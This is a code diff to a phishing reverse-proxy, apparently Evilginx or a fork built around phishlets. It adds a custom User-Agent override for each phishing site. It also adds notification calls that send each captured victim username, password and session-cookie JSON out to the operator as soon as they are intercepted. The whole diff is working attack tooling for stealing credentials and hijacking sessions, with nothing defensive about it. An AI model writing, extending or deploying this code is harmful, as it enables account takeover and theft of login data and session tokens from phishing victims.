@@ -179,6 +179,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			// inject custom user-agent if set
+			plet := p.getPhishletByPhishHost(req.Host)
+			originalUA := req.Header.Get("User-Agent")
+			if plet != nil {
+				customUA, ok := p.cfg.GetSiteCustomUa(plet.Name)
+				if ok && customUA != "" {
+					req.Header.Set("User-Agent", customUA)
+					log.Debug("Injected custom User-Agent for phishlet '%s': %s", plet.Name, customUA)
+				}
+			}
+
 			if p.cfg.GetBlacklistMode() != "off" {
 				if p.bl.IsBlacklisted(from_ip) {
 					if p.bl.IsVerbose() {
@@ -397,7 +408,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 									sid := p.last_sid
 									p.last_sid += 1
-									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
+									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), originalUA, remote_addr)
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
@@ -693,6 +704,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 										log.Error("database: %v", err)
 									}
+
+									if p.cfg.GetSiteNotifyMode(pl.Name) != "off" {
+										// Send notification
+										SendNotification(pl.Name, "Username Captured!", um[1], p.cfg.IsSiteNotifyModeMinimal(pl.Name))
+									}
 								}
 							}
 
@@ -703,6 +719,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 										log.Error("database: %v", err)
+									}
+
+									if p.cfg.GetSiteNotifyMode(pl.Name) != "off" {
+										// Send notification
+										SendNotification(pl.Name, "Password Captured!", pm[1], p.cfg.IsSiteNotifyModeMinimal(pl.Name))
 									}
 								}
 							}
@@ -775,6 +796,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
 											}
+
+											if p.cfg.GetSiteNotifyMode(pl.Name) != "off" {
+												// Send notification
+												SendNotification(pl.Name, "Username Captured!", um[1], p.cfg.IsSiteNotifyModeMinimal(pl.Name))
+											}
 										}
 									}
 									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
@@ -784,6 +810,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
+											}
+
+											if p.cfg.GetSiteNotifyMode(pl.Name) != "off" {
+												// Send notification
+												SendNotification(pl.Name, "Password Captured!", pm[1], p.cfg.IsSiteNotifyModeMinimal(pl.Name))
 											}
 										}
 									}
@@ -1072,6 +1103,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						s.Finish(false)
 
+						if p.cfg.GetSiteNotifyMode(pl.Name) != "off" {
+							cookieJson := ModdedCookieTokensToJSON(s.CookieTokens)
+							// Send notification
+							SendNotification(pl.Name, "Session Captured!", cookieJson, p.cfg.IsSiteNotifyModeMinimal(pl.Name))
+						}
+
 						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 							rid, ok := s.Params["rid"]
 							if ok && rid != "" {
@@ -1210,6 +1247,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 							if err == nil {
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+							}
+
+							if p.cfg.GetSiteNotifyMode(pl.Name) != "off" {
+								cookieJson := ModdedCookieTokensToJSON(s.CookieTokens)
+								// Send notification
+								SendNotification(pl.Name, "Session Captured!", cookieJson, p.cfg.IsSiteNotifyModeMinimal(pl.Name))
 							}
 
 							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
